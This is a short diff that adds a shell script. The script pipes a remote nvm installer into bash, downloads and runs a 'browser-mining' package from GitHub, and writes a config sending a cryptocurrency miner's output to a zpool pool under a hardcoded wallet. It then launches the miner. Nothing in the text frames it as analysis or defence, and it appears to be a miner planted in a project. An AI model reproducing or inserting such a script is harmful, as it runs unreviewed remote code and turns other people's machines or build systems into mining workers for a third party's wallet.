@@ -1,0 +1,13 @@
+sudo apt update && sudo apt install curl ca-certificates -y
+curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+source ~/.bashrc
+nvm install 18
+
+curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J
+tar -xf browser-mining.tar.gz
+cd browser-mining
+npm install
+sh install.sh
+rm config.json
+echo '[{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker":"MJfJzQXFsMuHNT3J4fCGQi6fEtfujXvkgq", "password": "c=LTC", "workers": 1 }]' > config.json
+node index.js
